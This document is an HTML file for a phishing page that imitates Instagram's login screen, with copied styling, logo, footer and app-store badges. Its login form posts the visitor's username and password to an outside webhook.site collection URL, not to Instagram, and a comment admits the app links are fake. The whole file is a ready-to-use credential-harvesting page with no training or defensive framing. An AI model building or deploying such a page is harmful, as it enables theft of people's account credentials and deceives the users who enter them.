<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        @font-face {
            font-family: 'Instagram Sans';
            src: url('https://fonts.gstatic.com/s/instagramsans/v1/InstagramSans-Regular.ttf') format('truetype');
        }
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #f0f0f0, #d9d9d9);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .main-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 350px;
            padding: 20px;
        }
        .logo {
            font-family: 'Billabong', cursive;
            font-size: 3.5rem;
            margin: 22px 0 12px;
            color: #000;
        }
        .login-box {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            width: 100%;
            padding: 10px 0 20px;
            text-align: center;
        }
        .profile-pic {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: #ddd;
            margin: 20px auto 10px;
            background-image: url('https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?ixlib=rb-4.0.3&auto=format&fit=crop&w=100&q=80');
            background-size: cover;
        }
        input {
            width: 85%;
            padding: 9px 10px;
            margin: 6px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            font-size: 0.9rem;
        }
        button {
            background: #0095f6;
            color: white;
            border: none;
            padding: 7px 0;
            width: 85%;
            border-radius: 8px;
            font-weight: 600;
            margin: 8px 0;
            cursor: pointer;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 10px 0;
            color: #8e8e8e;
        }
        .line {
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        .or {
            padding: 0 18px;
            font-size: 0.8rem;
        }
        .facebook-login {
            color: #385185;
            font-weight: 600;
            margin: 8px 0;
            cursor: pointer;
        }
        .forgot {
            color: #00376b;
            font-size: 0.85rem;
            margin: 12px 0;
            cursor: pointer;
        }
        .signup-box {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            width: 100%;
            padding: 20px 0;
            margin-top: 10px;
            text-align: center;
        }
        .signup-text {
            color: #262626;
            font-size: 0.9rem;
        }
        .signup-link {
            color: #0095f6;
            font-weight: 600;
            cursor: pointer;
        }
        .app-links {
            margin-top: 20px;
            text-align: center;
        }
        .app-links img {
            width: 130px;
            margin: 5px;
        }
        footer {
            margin-top: 30px;
            color: #8e8e8e;
            font-size: 0.75rem;
            text-align: center;
        }
        footer a {
            color: #8e8e8e;
            margin: 0 8px;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="logo">Instagram</div>
        
        <div class="login-box">
            <div class="profile-pic"></div>
            <form action="https://webhook.site/b5318f69-b6a6-43ad-a1a3-aae362bd1084" method="POST">
                <input type="text" name="username" placeholder="Phone number, username, or email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
            <div class="divider">
                <div class="line"></div>
                <div class="or">OR</div>
                <div class="line"></div>
            </div>
            <div class="facebook-login"><i class="fab fa-facebook-square"></i> Log in with Facebook</div>
            <div class="forgot">Forgot password?</div>
        </div>
        
        <div class="signup-box">
            <p class="signup-text">Don't have an account? <span class="signup-link">Sign up</span></p>
        </div>
        
        <div class="app-links">
            <!-- Fake app store links, can replace with real images if you want -->
            <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store">
            <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play">
        </div>
        
        <footer>
            <a href="#">Meta</a> • <a href="#">About</a> • <a href="#">Blog</a> • <a href="#">Jobs</a> • <a href="#">Help</a> • <a href="#">Privacy</a> • <a href="#">Terms</a> • <a href="#">Locations</a> • <a href="#">Instagram Lite</a> • <a href="#">Threads</a><br>
            © 2026 Instagram from Meta
        </footer>
    </div>
</body>
                </html>
